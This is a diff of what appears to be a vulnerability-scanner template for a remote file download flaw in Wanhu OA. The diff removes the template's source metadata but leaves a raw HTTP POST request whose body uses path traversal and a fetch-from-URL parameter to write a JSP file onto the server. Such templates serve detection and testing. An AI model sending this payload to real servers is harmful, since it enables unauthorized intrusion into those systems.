@@ -3,12 +3,8 @@ info:
   name: 万户OA file2Html.controller 远程文件下载漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hbs2cmxbqoqg13x3'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hbs2cmxbqoqg13x3
-    fofa: 暂无
 http:
 - raw:
   - 'POST /defaultroot/yzConvertFile/file2Html.controller HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Accept-Encoding: gzip, deflate, br
-
-
 
 
     fileName=qwe.jsp&path=../platform/portal/&url=http://www.baidu.com
